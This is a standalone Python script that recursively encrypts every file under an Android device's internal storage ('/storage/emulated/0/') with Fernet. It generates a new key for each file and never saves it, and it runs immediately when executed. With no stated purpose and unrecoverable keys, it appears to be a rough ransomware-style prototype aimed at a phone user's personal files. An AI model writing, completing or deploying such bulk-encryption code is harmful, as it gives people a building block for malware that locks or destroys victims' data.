from cryptography.fernet import Fernet
import os

def encrypt_file(file_path, output_path):
    # Generate a Fernet key
    key = Fernet.generate_key()
    cipher = Fernet(key)

    with open(file_path, "rb") as file:
        plaintext = file.read()

    # Encrypt the file
    ciphertext = cipher.encrypt(plaintext)

    # Save the encrypted file
    with open(output_path, "wb") as file:
        file.write(ciphertext)

    print(f"File encrypted and saved as {output_path}")

def encrypt_files_in_directory(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypted_file = file_path + "_encrypted"  # Appending "_encrypted" to the original filename
            encrypt_file(file_path, encrypted_file)

def main():
    try:
        internal_storage = "/storage/emulated/0/"
        encrypt_files_in_directory(internal_storage)

    except FileNotFoundError as e:
        print(f"Error: {e}")


main()
